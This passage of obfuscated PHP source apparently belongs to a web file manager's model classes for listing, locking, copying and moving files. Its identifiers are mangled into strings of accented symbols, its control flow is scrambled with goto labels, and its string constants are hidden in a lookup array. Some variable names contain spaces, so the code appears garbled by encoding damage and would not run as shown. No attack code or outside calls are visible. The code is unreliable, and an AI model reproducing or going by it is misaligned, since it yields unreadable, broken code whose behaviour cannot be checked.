self::TYPE_SYSTEM) { $BôåªØô‰‹ = $this->sourceInfo($a∏ëúè´∫õ[0], !0); $dœäªÓ¨ı∫ = $BôåªØô‰‹[$Bƒáôî§®Ω[28]]; } } } $dœäªÓ¨ı∫ = $dœäªÓ¨ı∫ ? $Bƒáôî§®Ω[8] . $dœäªÓ¨ı∫ . $Bƒáôî§®Ω[8] : $Bƒáôî§®Ω[8]; return $dœäªÓ¨ı∫; } protected function _listAppendUser(&$f√∂ÔÔ’–“) { $D˜ëÂçÙ©˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c£µÌ◊⁄ë = array_to_keyvalue($f√∂ÔÔ’–“, $D˜ëÂçÙ©˜[33], $D˜ëÂçÙ©˜[375]); $BËÚœè±æµ = array_to_keyvalue($f√∂ÔÔ’–“, $D˜ëÂçÙ©˜[33], $D˜ëÂçÙ©˜[376]); $aü‹Ôß’— = array_merge($c£µÌ◊⁄ë, $BËÚœè±æµ); $Eùœâ…§Ë‹ = Model($D˜ëÂçÙ©˜[469])->userListInfo($aü‹Ôß’—); foreach ($f√∂ÔÔ’–“ as &$CË…É¥Ï„±) { $e°∑ñˆîŒ≤ = $CË…É¥Ï„±[$D˜ëÂçÙ©˜[375]]; $CË…É¥Ï„±[$D˜ëÂçÙ©˜[375]] = $Eùœâ…§Ë‹[$e°∑ñˆîŒ≤] ? $Eùœâ…§Ë‹[$e°∑ñˆîŒ≤] : !1; $e°∑ñˆîŒ≤ = $CË…É¥Ï„±[$D˜ëÂçÙ©˜[376]]; $CË…É¥Ï„±[$D˜ëÂçÙ©˜[376]] = $Eùœâ…§Ë‹[$e°∑ñˆîŒ≤] ? $Eùœâ…§Ë‹[$e°∑ñˆîŒ≤] : !1; if (isset($CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]]) && $CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]][$D˜ëÂçÙ©˜[470]]) { $EÍîÇŸ√¢Œ = $GLOBALS[$D˜ëÂçÙ©˜[6]][$D˜ëÂçÙ©˜[85]][$D˜ëÂçÙ©˜[471]]; if ($CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]][$D˜ëÂçÙ©˜[472]] <= time() - $EÍîÇŸ√¢Œ) { $this->metaSet($CË…É¥Ï„±[$D˜ëÂçÙ©˜[366]], $D˜ëÂçÙ©˜[470], null); $this->metaSet($CË…É¥Ï„±[$D˜ëÂçÙ©˜[366]], $D˜ëÂçÙ©˜[472], null); unset($CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]][$D˜ëÂçÙ©˜[470]]); continue; } $e¢‰†„íáŸ = $CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]][$D˜ëÂçÙ©˜[470]]; $CË…É¥Ï„±[$D˜ëÂçÙ©˜[413]][$D˜ëÂçÙ©˜[473]] = Model($D˜ëÂçÙ©˜[469])->getInfoSimpleOuter($e¢‰†„íáŸ); } } } public function parentLevelArray($CøêÂ’îíÓ) { $Bû¥¬ª´ñç =& $_SERVER[£¿ÌÙëü¡¯¯]; $CøêÂ’îíÓ = explode($Bû¥¬ª´ñç[47], trim($CøêÂ’îíÓ, $Bû¥¬ª´ñç[47])); return array_remove_value($CøêÂ’îíÓ, $Bû¥¬ª´ñç[464]); } public function listAll($Eé‡áä≤Û˜) { goto bôóƒ≥ÀÀÉ; C∑Ÿ™íﬂ˘º: $this->_listAppendAuth($a€ÿﬁìèıç); $this->_listAppendUser($a€ÿﬁìèıç); $this->_listAppendPath($a€ÿﬁìèıç); goto DÉ¬Ü∫‰ Â; EÖÊﬁÀá–©: $c∂ÒÓ˘ò≥¬ = $AΩÊπéò≤ë[478]; $a¡∂Ôëú‡† = "\x4c\x45\x46\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\154\145\40\146\151\x6c\145\x20\x6f\156\40\163\157\165\x72\x63\145\x2e\x66\x69\154\145\x49\104\x20\75\40\x66\x69\x6c\145\56\x66\151\154\145\111\x44"; $a€ÿﬁìèıç = $this->alias($AΩÊπéò≤ë[479])->field($c∂ÒÓ˘ò≥¬)->where($AöÙ¡ﬂÚõ)->join($a¡∂Ôëú‡†)->select(); goto C∑Ÿ™íﬂ˘º; DÉ¬Ü∫‰ Â: $a€ÿﬁìèıç = array_to_keyvalue($a€ÿﬁìèıç, $AΩÊπéò≤ë[366]); $CÍÑ∑îÀÌà = "\x2f{$Fõ·∏∑œ≥ñ[$AΩÊπéò≤ë[28]]}\x2f"; $CÍÑ∑îÀÌà = $CÍÑ∑îÀÌà == $AΩÊπéò≤ë[463] ? $AΩÊπéò≤ë[8] : $CÍÑ∑îÀÌà; goto F÷´ÉÌÍ¯î; F÷´ÉÌÍ¯î: $BÎ´Ôµ€Ëø = array(); foreach ($a€ÿﬁìèıç as $f¡≈∂ì´¬‡ => $båœÉÓÂ”¥) { goto CÖÙ∆ã˘‚…; AÛÓ™Ûã¥≤: $Eã≠ÚÎÕàÉ = str_replace($AΩÊπéò≤ë[463], $AΩÊπéò≤ë[8], $Eã≠ÚÎÕàÉ); $Eã≠ÚÎÕàÉ = str_replace($AΩÊπéò≤ë[463], $AΩÊπéò≤ë[8], $Eã≠ÚÎÕàÉ); $Eº™ÇÚ—Ùâ = array($AΩÊπéò≤ë[384] => str_replace($AΩÊπéò≤ë[463], $AΩÊπéò≤ë[8], $Eã≠ÚÎÕàÉ), $AΩÊπéò≤ë[480] => intval($båœÉÓÂ”¥[$AΩÊπéò≤ë[367]]), $AΩÊπéò≤ë[388] => $this->pathInfoFilter($båœÉÓÂ”¥, !0)); goto Aá∫¶‹√±Î; cﬁãÓé¿Ç–: for ($c√á‰ËôéÔ = 0; $c√á‰ËôéÔ < count($Fê ‘·óÓã); $c√á‰ËôéÔ++) { $Eã≠ÚÎÕàÉ .= $a€ÿﬁìèıç[$Fê ‘·óÓã[$c√á‰ËôéÔ]][$AΩÊπéò≤ë[28]] . $AΩÊπéò≤ë[8]; } $Eã≠ÚÎÕàÉ .= $båœÉÓÂ”¥[$AΩÊπéò≤ë[28]]; if ($båœÉÓÂ”¥[$AΩÊπéò≤ë[367]]) { $Eã≠ÚÎÕàÉ .= $AΩÊπéò≤ë[8]; } goto AÛÓ™Ûã¥≤; CÖÙ∆ã˘‚…: $Fê ‘·óÓã = $this->parentLevelArray($båœÉÓÂ”¥[$AΩÊπéò≤ë[455]]); array_shift($Fê ‘·óÓã); $Eã≠ÚÎÕàÉ = $CÍÑ∑îÀÌà; goto cﬁãÓé¿Ç–; Aá∫¶‹√±Î: if (!$båœÉÓÂ”¥[$AΩÊπéò≤ë[367]]) { $Eº™ÇÚ—Ùâ[$AΩÊπéò≤ë[415]] = $båœÉÓÂ”¥[$AΩÊπéò≤ë[415]]; $Eº™ÇÚ—Ùâ[$AΩÊπéò≤ë[481]] = $båœÉÓÂ”¥[$AΩÊπéò≤ë[76]]; } $BÎ´Ôµ€Ëø[] = $Eº™ÇÚ—Ùâ; goto C’ã⁄—µŸò; C’ã⁄—µŸò: } return $BÎ´Ôµ€Ëø; goto a π§⁄öµö; bôóƒ≥ÀÀÉ: $AΩÊπéò≤ë =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fõ·∏∑œ≥ñ = $this->sourceInfo($Eé‡áä≤Û˜); $AöÙ¡ﬂÚõ = array($AΩÊπéò≤ë[474] => array($AΩÊπéò≤ë[475], $Fõ·∏∑œ≥ñ[$AΩÊπéò≤ë[455]] . $Eé‡áä≤Û˜ . $AΩÊπéò≤ë[476]), $AΩÊπéò≤ë[477] => 0); goto EÖÊﬁÀá–©; a π§⁄öµö: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($CΩ«íöëØï) { goto bÕ∆êµÕ¥Ó; A∂é ËË¶∂: $this->_lockEvent($CΩ«íöëØï, array($eµîç˜ÿÏÆ[485], $eµîç˜ÿÏÆ[486]), $c•®ì∏¢…É); $this->_lockCheckEnd($eµîç˜ÿÏÆ[482], $CΩ«íöëØï); goto CÊ◊Œ◊Ω‡ï; bÕ∆êµÕ¥Ó: $eµîç˜ÿÏÆ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($eµîç˜ÿÏÆ[482], $CΩ«íöëØï); goto f‹µ¿·≈†™; f‹µ¿·≈†™: $c•®ì∏¢…É = 1; $this->_lockEvent($CΩ«íöëØï, array($eµîç˜ÿÏÆ[483], $eµîç˜ÿÏÆ[484]), $c•®ì∏¢…É); $this->_lockParent($CΩ«íöëØï, array($eµîç˜ÿÏÆ[484]), $c•®ì∏¢…É); goto A∂é ËË¶∂; CÊ◊Œ◊Ω‡ï: } public function lockCopyEnd($FçÖ÷’Ûà∂) { $f¡≈ö∆©◊† =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $F∞¥‰áƒõƒ = 0; $this->_lockEvent($FçÖ÷’Ûà∂, array($f¡≈ö∆©◊†[483], $f¡≈ö∆©◊†[484]), $F∞¥‰áƒõƒ); $this->_lockParent($FçÖ÷’Ûà∂, array($f¡≈ö∆©◊†[484]), $F∞¥‰áƒõƒ); $this->_lockEvent($FçÖ÷’Ûà∂, array($f¡≈ö∆©◊†[485], $f¡≈ö∆©◊†[486]), $F∞¥‰áƒõƒ); } public function lockWriteStart($f™πﬁÏò‚Ù, $Dπéà±í™° = '') { goto eîˆ˘ÔÀÿØ; eîˆ˘ÔÀÿØ: $cƒªßââµ´ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($cƒªßââµ´[483], $f™πﬁÏò‚Ù); goto BÍÆ√ìÚﬂ∫; BÍÆ√ìÚﬂ∫: $C≠¥‚πûˆ÷ = 1; $this->_lockKey($cƒªßââµ´[487] . $f™πﬁÏò‚Ù . $cƒªßââµ´[94] . $Dπéà±í™°, $C≠¥‚πûˆ÷); $this->_lockEvent($f™πﬁÏò‚Ù, array($cƒªßââµ´[482], $cƒªßââµ´[484]), $C≠¥‚πûˆ÷); goto FÔ‚Ã›ë˘ü; FÔ‚Ã›ë˘ü: $this->_lockParent($f™πﬁÏò‚Ù, array($cƒªßââµ´[482], $cƒªßââµ´[484]), $C≠¥‚πûˆ÷); $this->_lockCheckEnd($cƒªßââµ´[483], $f™πﬁÏò‚Ù); goto D¿∂å„ñ⁄Á; D¿∂å„ñ⁄Á: } public function lockWriteEnd($fÛÊ≤”ˆ∆¡, $cÎ“ë¶œ ø = '') { $A°ÑìÏ∆Ω  =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $dêÙÉ¬ÔÈË = 0; $this->_lockKey($A°ÑìÏ∆Ω [487] . $fÛÊ≤”ˆ∆¡ . $A°ÑìÏ∆Ω [94] . $cÎ“ë¶œ ø, $dêÙÉ¬ÔÈË); $this->_lockEvent($fÛÊ≤”ˆ∆¡, array($A°ÑìÏ∆Ω [482], $A°ÑìÏ∆Ω [484]), $dêÙÉ¬ÔÈË); $this->_lockParent($fÛÊ≤”ˆ∆¡, array($A°ÑìÏ∆Ω [482], $A°ÑìÏ∆Ω [484]), $dêÙÉ¬ÔÈË); } public function lockMoveStart($AçèçùÂÀí) { goto EáÁÁ›ﬂØê; cÃªÓÒæÙõ: $Eê’ÿ¬¬¿ = 1; $this->_lockKey($F´ôè—¬ÜŒ[488] . $AçèçùÂÀí, $Eê’ÿ¬¬¿); $this->_lockEvent($AçèçùÂÀí, array($F´ôè—¬ÜŒ[482], $F´ôè—¬ÜŒ[483]), $Eê’ÿ¬¬¿); goto dÊ¯ﬁÙê—ì; dÊ¯ﬁÙê—ì: $this->_lockParent($AçèçùÂÀí, array($F´ôè—¬ÜŒ[482], $F´ôè—¬ÜŒ[484]), $Eê’ÿ¬¬¿); $this->_lockEvent($AçèçùÂÀí, array($F´ôè—¬ÜŒ[489], $F´ôè—¬ÜŒ[485], $F´ôè—¬ÜŒ[486]), $Eê’ÿ¬¬¿); $this->_lockCheckEnd($F´ôè—¬ÜŒ[484], $AçèçùÂÀí); goto dœﬁ°‹µ‡·; EáÁÁ›ﬂØê: $F´ôè—¬ÜŒ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($F´ôè—¬ÜŒ[484], $AçèçùÂÀí); goto cÃªÓÒæÙõ; dœﬁ°‹µ‡·: } public function lockMoveEnd($Aáé¢öè’Ã) { goto eÒŸÿÉÊÃÖ; EŒΩ∑·¿Ó“: $this->_lockKey($dﬁà¢ÚªÈ…[488] . $Aáé¢öè’Ã, $c†„îôôöÆ); $this->_lockEvent($Aáé¢öè’Ã, array($dﬁà¢ÚªÈ…[482], $dﬁà¢ÚªÈ…[483]), $c†„îôôöÆ); $this->_lockParent($Aáé¢öè’Ã, array($dﬁà¢ÚªÈ…[482], $dﬁà¢ÚªÈ…[484]), $c†„îôôöÆ); goto aÇ◊¡∆Ω∑Ω; eÒŸÿÉÊÃÖ: $dﬁà¢ÚªÈ… =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->allowLock()) { return; } $c†„îôôöÆ = 0; goto EŒΩ∑·¿Ó“; aÇ◊¡∆Ω∑Ω: $this->_lockEvent($Aáé¢öè’Ã, array($dﬁà¢ÚªÈ…[489], $dﬁà¢ÚªÈ…[485], $dﬁà¢ÚªÈ…[486]), $c†„îôôöÆ); goto A…„°Ê’Æù; A…„°Ê’Æù: } private function _lockCheck($aœ‡ˆπëπä, $bäè◊Ê˘ÀÕ) { goto dÓ°äçÂã√; dÓ°äçÂã√: $a˜ÉüÍâÙΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÍÙ∑ëÀ©∏ = $this->sourceInfo($bäè◊Ê˘ÀÕ); $A€ì⁄ˆüŸ∆ = $aœ‡ˆπëπä . $a˜ÉüÍâÙΩ[94] . $bäè◊Ê˘ÀÕ; goto CïÏ™ù‡æ˜; a˘Ω˘ôâ¢: CacheLock::setErrorMsg($a˜ÉüÍâÙΩ[154] . htmlspecialchars($cÍÙ∑ëÀ©∏[$a˜ÉüÍâÙΩ[28]]) . $a˜ÉüÍâÙΩ[468] . $F◊´Çﬂ·ˆÜ); $this->_lockKey($A€ì⁄ˆüŸ∆, 1); $this->_lockKey($A€ì⁄ˆüŸ∆, 0); goto cßÚ˜œåä±; cßÚ˜œåä±: $b®ı©Ø”π» = array_reverse($this->parentLevelArray($cÍÙ∑ëÀ©∏[$a˜ÉüÍâÙΩ[455]])); foreach ($b®ı©Ø”π» as $C¬ì∑∫‡√∫) { $A€ì⁄ˆüŸ∆ = $aœ‡ˆπëπä . $a˜ÉüÍâÙΩ[491] . $C¬ì∑∫‡√∫; if (CacheLock::lockGet($a˜ÉüÍâÙΩ[492] . $A€ì⁄ˆüŸ∆)) { $cÍÙ∑ëÀ©∏ = $this->sourceInfo($C¬ì∑∫‡√∫); CacheLock::setErrorMsg($a˜ÉüÍâÙΩ[154] . htmlspecialchars($cÍÙ∑ëÀ©∏[$a˜ÉüÍâÙΩ[28]]) . $a˜ÉüÍâÙΩ[468] . $F◊´Çﬂ·ˆÜ); $this->_lockKey($A€ì⁄ˆüŸ∆, 1); $this->_lockKey($A€ì⁄ˆüŸ∆, 0); } } goto DË—ıÌ‹›Ø; CïÏ™ù‡æ˜: $this->_lockTimeStart[$A€ì⁄ˆüŸ∆] = timeFloat(); if (!is_array($cÍÙ∑ëÀ©∏)) { return; } $F◊´Çﬂ·ˆÜ = LNG($a˜ÉüÍâÙΩ[490]); goto a˘Ω˘ôâ¢; DË—ıÌ‹›Ø: } private function _lockCheckEnd($d¯Á…»Ô±Ï, $CÉƒÀﬁäÚ¡) { goto añæØ–‹å≥; eØ∂¢ô˜∞è: if (!isset($this->_lockTimeStart[$CÌª¿≈„©€])) { return; } $B…äÙÇû≤∞ = timeFloat() - $this->_lockTimeStart[$CÌª¿≈„©€]; unset($this->_lockTimeStart[$CÌª¿≈„©€]); goto bä‘’ﬂàÿû; añæØ–‹å≥: $C˘â¥ÆÜ¥ı =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÌª¿≈„©€ = $d¯Á…»Ô±Ï . $C˘â¥ÆÜ¥ı[94] . $CÉƒÀﬁäÚ¡; CacheLock::setErrorMsg($C˘â¥ÆÜ¥ı[358]); goto eØ∂¢ô˜∞è; bä‘’ﬂàÿû: if ($B…äÙÇû≤∞ > 0.5) { unset(self::$cacheSourceInfo[$C˘â¥ÆÜ¥ı[406] . $CÉƒÀﬁäÚ¡]); } $Eˆ·»ÂçÜ› = $this->sourceInfo($CÉƒÀﬁäÚ¡); if (!$Eˆ·»ÂçÜ›) { show_json(LNG($C˘â¥ÆÜ¥ı[103]), !1); } goto D◊∞ä‚€ÿ; D◊∞ä‚€ÿ: } private function _lockParent($d¶‹¡ö–ºË, $dŸæóó‡®ç, $DçÇÊÑÒŸ‹) { if (!$this->autoLockSet) { return; } $eÇ«Éÿ´∂í = $this->sourceInfo($d¶‹¡ö–ºË); if (!is_array($eÇ«Éÿ´∂í)) { return; } $CÁ›ä∑ö¯Œ = array_reverse($this->parentLevelArray($eÇ«Éÿ´∂í[$_SERVER[£¿ÌÙëü¡¯¯][455]])); foreach ($CÁ›ä∑ö¯Œ as $EΩŸÇØÕä•) { $this->_lockEvent($EΩŸÇØÕä•, $dŸæóó‡®ç, $DçÇÊÑÒŸ‹); } } private function _lockEvent($c∑∑£üˆßœ, $cã‰Û¿ÿ’ª, $E«ïåãâœ›) { $Cò«Œ˜ÀÇ¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->autoLockSet) { return; } foreach ($cã‰Û¿ÿ’ª as $dô√Çı◊÷) { $DÉôÖÈ˜ºÑ = $dô√Çı◊÷ . $Cò«Œ˜ÀÇ¥[94] . $c∑∑£üˆßœ; if ($E«ïåãâœ› && CacheLock::lockGet($Cò«Œ˜ÀÇ¥[492] . $DÉôÖÈ˜ºÑ)) { continue; } $this->_lockKey($DÉôÖÈ˜ºÑ, $E«ïåãâœ›); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($CåÙÖ•™‰ô, $aØ‘‡‡¡£Æ = 1) { $BﬁÒı«†Ôæ = $_SERVER[£¿ÌÙëü¡¯¯][492] . $CåÙÖ•™‰ô; if ($aØ‘‡‡¡£Æ) { if (isset(self::$_lockItemArr[$BﬁÒı«†Ôæ])) { return; } self::$_lockItemArr[$BﬁÒı«†Ôæ] = 1; CacheLock::lock($BﬁÒı«†Ôæ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$BﬁÒı«†Ôæ])) { return; } unset(self::$_lockItemArr[$BﬁÒı«†Ôæ]); CacheLock::unlock($BﬁÒı«†Ôæ); } } public function isParentOf($C±ÉÇÀ‹Œâ, $DµÜï≈£Öø) { goto EƒµÉÇ¯ä‹; EƒµÉÇ¯ä‹: $B–Üµ¶¨É“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e®π¥É„É = $this->sourceInfo($C±ÉÇÀ‹Œâ); $eÉ Ç ËëÙ = $this->sourceInfo($DµÜï≈£Öø); goto bÛ®ÛÀ≈Û∆; c¥Àï∂û‡: return $bÍÍ¢Éå‘û; goto C ≠ﬁºî∑Ú; bÛ®ÛÀ≈Û∆: $fÃâ»§°ü = $e®π¥É„É[$B–Üµ¶¨É“[455]] . $e®π¥É„É[$B–Üµ¶¨É“[366]] . $B–Üµ¶¨É“[47]; $Aê∆‰πÔÓß = $eÉ Ç ËëÙ[$B–Üµ¶¨É“[455]] . $eÉ Ç ËëÙ[$B–Üµ¶¨É“[366]] . $B–Üµ¶¨É“[47]; $bÍÍ¢Éå‘û = strpos($Aê∆‰πÔÓß, $fÃâ»§°ü) === 0; goto c¥Àï∂û‡; C ≠ﬁºî∑Ú: } public function copy($F®ß™é ‰™, $a„ŸæëÛ˘˘, $a”ø∂íÀÊó = REPEAT_REPLACE, $D¶£î◊»–Í = '') { goto bÖá èŒÀ; Aıë≤”±‚©: $this->lockCopyStart($F®ß™é ‰™); $this->lockWriteStart($a„ŸæëÛ˘˘, $EÊàé‚Ú„É); $aì¿Œ«åù = array($c¨Íˆ°≤ëâ[493] => array(), $c¨Íˆ°≤ëâ[494] => array(), $c¨Íˆ°≤ëâ[495] => array()); goto eîÓ° ¶í·; Aã°åÍÈ◊Ë: return $e’Ñì•àä; goto CéπòÕÀáﬁ; EÇê’ÓÂ»Ó: Model($c¨Íˆ°≤ëâ[496])->addAll($aì¿Œ«åù[$c¨Íˆ°≤ëâ[494]], array(), !0); if ($dô’—úã¥÷ != $e’Ñì•àä || $e∞——ıø…–[$c¨Íˆ°≤ëâ[367]] == $c¨Íˆ°≤ëâ[84]) { Model($c¨Íˆ°≤ëâ[497])->eventCopy($e’Ñì•àä); } $this->saveAll($aì¿Œ«åù[$c¨Íˆ°≤ëâ[495]]); goto F‹∂â∏÷˘•; F‹∂â∏÷˘•: Model($c¨Íˆ°≤ëâ[164])->linkAdd($aì¿Œ«åù[$c¨Íˆ°≤ëâ[493]]); $this->folderSizeReset($a„ŸæëÛ˘˘); $this->updateModifyTime($a„ŸæëÛ˘˘); goto Aã°åÍÈ◊Ë; eçﬂû≥á¡˜: $this->lockCopyEnd($F®ß™é ‰™); $this->lockWriteEnd($a„ŸæëÛ˘˘, $EÊàé‚Ú„É); if ($e∞——ıø…–[$c¨Íˆ°≤ëâ[367]] == $c¨Íˆ°≤ëâ[84] && $dô’—úã¥÷ == $e’Ñì•àä) { $this->folderSizeResetChildren($dô’—úã¥÷); } goto EÇê’ÓÂ»Ó; eîÓ° ¶í·: $dô’—úã¥÷ = $this->fileNameExistCache($a„ŸæëÛ˘˘, $e∞——ıø…–[$c¨Íˆ°≤ëâ[28]]); $e’Ñì•àä = $this->_copy($F®ß™é ‰™, $a„ŸæëÛ˘˘, $a”ø∂íÀÊó, $aì¿Œ«åù, !0, $D¶£î◊»–Í); $this->_childrenListClear(); goto eçﬂû≥á¡˜; bÖá èŒÀ: $c¨Íˆ°≤ëâ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e∞——ıø…– = $this->sourceInfo($F®ß™é ‰™); $B©–Ÿ≤û†Ù = $this->sourceInfo($a„ŸæëÛ˘˘); goto Aûã≈ºâÔæ; Aûã≈ºâÔæ: if (!$e∞——ıø…– || !$B©–Ÿ≤û†Ù || $B©–Ÿ≤û†Ù[$c¨Íˆ°≤ëâ[367]] != $c¨Íˆ°≤ëâ[84]) { return !1; } if ($this->isParentOf($F®ß™é ‰™, $a„ŸæëÛ˘˘)) { return !1; } $EÊàé‚Ú„É = $D¶£î◊»–Í ? $D¶£î◊»–Í : $e∞——ıø…–[$c¨Íˆ°≤ëâ[28]]; goto Aıë≤”±‚©; CéπòÕÀáﬁ: } private function _copy($b“ºÊñÇ£ä, $Eòá‘≠¨¬ë, $A—∆¬©ùô¬, &$C–ë«üéçÊ, $b˘ıíÂñ©Ï, $AÑØ¬≥≤€© = '') { goto Eœê‡ÉÑ»Ñ; Dé®´àÕòó: if (!$C™¡ÿê»çö) { return $this->_copyCreate($b“ºÊñÇ£ä, $Eòá‘≠¨¬ë, $E›ù˜¢áà´, $C–ë«üéçÊ); } $aèñè’æÏ∑ = $C™¡ÿê»çö; if ($AÕÒÑŒﬁ¬á) { if ($A—∆¬©ùô¬ == REPEAT_RENAME_FOLDER) { $E›ù˜¢áà´ = $this->fileNameAutoCache($Eòá‘≠¨¬ë, $E›ù˜¢áà´, $A—∆¬©ùô¬, $AÕÒÑŒﬁ¬á); $aèñè’æÏ∑ = $this->_copyCreate($b“ºÊñÇ£ä, $Eòá‘≠¨¬ë, $E›ù˜¢áà´, $C–ë«üéçÊ); } else { $f÷óêÒœÙ‡ = $this->_childrenList($b“ºÊñÇ£ä); foreach ($f÷óêÒœÙ‡ as $A÷âÍõ∆≈∞) { $this->_copy($A÷âÍõ∆≈∞[$c·˜åÔ·ãÛ[366]], $C™¡ÿê»çö, $A—∆¬©ùô¬, $C–ë«üéçÊ, !1); } } } else { if ($A—∆¬©ùô¬ == REPEAT_RENAME || $A—∆¬©ùô¬ == REPEAT_RENAME_FOLDER) { $E›ù˜¢áà´ = $this->fileNameAutoCache($Eòá‘≠¨¬ë, $E›ù˜¢áà´, $A—∆¬©ùô¬, $AÕÒÑŒﬁ¬á); $aèñè’æÏ∑ = $this->_copyCreate($b“ºÊñÇ£ä, $Eòá‘≠¨¬ë, $E›ù˜¢áà´, $C–ë«üéçÊ); } else { if ($A—∆¬©ùô¬ == REPEAT_REPLACE) { $AêÂµó‹»∆ = $this->sourceInfoCache($C™¡ÿê»çö); $dëá∂Œãªå = $this->fileHistory($AêÂµó‹»∆, $Eêõü¨Ãºõ[$c·˜åÔ·ãÛ[415]], $Eêõü¨Ãºõ[$c·˜åÔ·ãÛ[78]]); if ($dëá∂Œãªå) { $C–ë«üéçÊ[$c·˜åÔ·ãÛ[493]][] = $Eêõü¨Ãºõ[$c·˜åÔ·ãÛ[415]]; } } else { if ($A—∆¬©ùô¬ == REPEAT_SKIP) { } } } Hook::trigger($c·˜åÔ·ãÛ[498], array($c·˜åÔ·ãÛ[499], $Eêõü¨Ãºõ, 0)); } goto D«óÂâŒ¡¢; Eœê‡ÉÑ»Ñ: $c·˜åÔ·ãÛ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eêõü¨Ãºõ = $this->sourceInfoCache($b“ºÊñÇ£ä); $AÕÒÑŒﬁ¬á = $Eêõü¨Ãºõ[$c·˜åÔ·ãÛ[367]] == $c·˜åÔ·ãÛ[84]; goto F¿•Ö¨√œ÷; D«óÂâŒ¡¢: return $aèñè’æÏ∑; goto côµ∑‚Ìâ¨; F¿•Ö¨√œ÷: $E›ù˜¢áà´ = $AÑØ¬≥≤€© ? $AÑØ¬≥≤€© : $Eêõü¨Ãºõ[$c·˜åÔ·ãÛ[28]]; $C™¡ÿê»çö = $this->fileNameExistCache($Eòá‘≠¨¬ë, $E›ù˜¢áà´); if ($b˘ıíÂñ©Ï) { $this->_childrenAllMake($b“ºÊñÇ£ä); if ($AÕÒÑŒﬁ¬á && $C™¡ÿê»çö) { $this->_childrenAllMake($C™¡ÿê»çö); } } goto Dé®´àÕòó; côµ∑‚Ìâ¨: } private function _copyCreate($aÕÜû≥ã˘˘, $fˆÇÃÉÖ≤ﬁ, $DÆ‰î∂’«Ÿ, &$Fâï¿Âµ≠∆) { goto FÖ∂íœƒ◊ó; fæ◊üé≥∏°: $Cò‰∫πÑ√‡ = $this->sourceInfo($D§∆“¥Ô¢Ê); foreach ($cÛ¢ÔƒóãÁ as $C‹Ó’Ùá‡Ö) { $FûåÌÒçÏà = $this->_makeItemData($C‹Ó’Ùá‡Ö, $Cò‰∫πÑ√‡, $C‹Ó’Ùá‡Ö[$f¨£öû©¯ç[28]]); $FûåÌÒçÏà[$f¨£öû©¯ç[455]] = $C‹Ó’Ùá‡Ö[$f¨£öû©¯ç[455]]; $Aè¿Õàä“ƒ[] = $FûåÌÒçÏà; } $this->chunkEventSet($f¨£öû©¯ç[503], array($f¨£öû©¯ç[504], $a§åôŸÁøˆ, $A∂±ˆò˜æŸ)); goto d∂†Í∆õ›∑; Cú©Øûœ„‹: foreach ($A‘ù®…˘ç€ as $C‹Ó’Ùá‡Ö) { $c¿ŒÔè∞ıå = $C‹Ó’Ùá‡Ö[$f¨£öû©¯ç[366]]; $fπùΩ…Õò≥ = $this->_childrenMatch($AÉâ¬äó©í, $C‹Ó’Ùá‡Ö, $Cò‰∫πÑ√‡); $f∆”ΩÂâ≈⁄[] = array($f¨£öû©¯ç[366], $c¿ŒÔè∞ıå, $f¨£öû©¯ç[457], $fπùΩ…Õò≥[$f¨£öû©¯ç[457]]); $BÃ∞≥ê≥’®[] = array($f¨£öû©¯ç[366], $c¿ŒÔè∞ıå, $f¨£öû©¯ç[455], $fπùΩ…Õò≥[$f¨£öû©¯ç[455]]); $this->_copyApplyMeta($C‹Ó’Ùá‡Ö, $Fâï¿Âµ≠∆); if ($C‹Ó’Ùá‡Ö[$f¨£öû©¯ç[367]] != $f¨£öû©¯ç[84]) { $Fâï¿Âµ≠∆[$f¨£öû©¯ç[493]][] = $C‹Ó’Ùá‡Ö[$f¨£öû©¯ç[415]]; } } $this->chunkEventSet($f¨£öû©¯ç[505], array($f¨£öû©¯ç[506], $a§åôŸÁøˆ, $A∂±ˆò˜æŸ)); $this->saveAll($f∆”ΩÂâ≈⁄); goto EÈÇ›ﬁà±Ê; báøÉºùæè: $a§åôŸÁøˆ = $this->_makeItemData($C˘»⁄òÉéÿ, $bÚ‡É•È‡Ç, $DÆ‰î∂’«Ÿ); Hook::trigger($f¨£öû©¯ç[500], $a§åôŸÁøˆ); Hook::trigger($f¨£öû©¯ç[501], array($f¨£öû©¯ç[502], $a§åôŸÁøˆ, 0)); goto FçéÉàåΩõ; A„äï¿¡∑˘: $AÉâ¬äó©í[$aÕÜû≥ã˘˘] = $D§∆“¥Ô¢Ê; $f∆”ΩÂâ≈⁄ = array(); $BÃ∞≥ê≥’® = array(); goto Cú©Øûœ„‹; FçéÉàåΩõ: $D§∆“¥Ô¢Ê = $this->add($a§åôŸÁøˆ); $Cÿò≠™ù“Œ = array($f¨£öû©¯ç[366] => $D§∆“¥Ô¢Ê, $f¨£öû©¯ç[28] => $DÆ‰î∂’«Ÿ); $this->_copyApplyMeta($Cÿò≠™ù“Œ, $Fâï¿Âµ≠∆); goto bâœﬂ©∂ìâ; Aâ‹¢±”˘Ó: $this->_childrenListAll($aÕÜû≥ã˘˘, $cÛ¢ÔƒóãÁ); $A∂±ˆò˜æŸ = count($cÛ¢ÔƒóãÁ); if ($A∂±ˆò˜æŸ == 0) { return 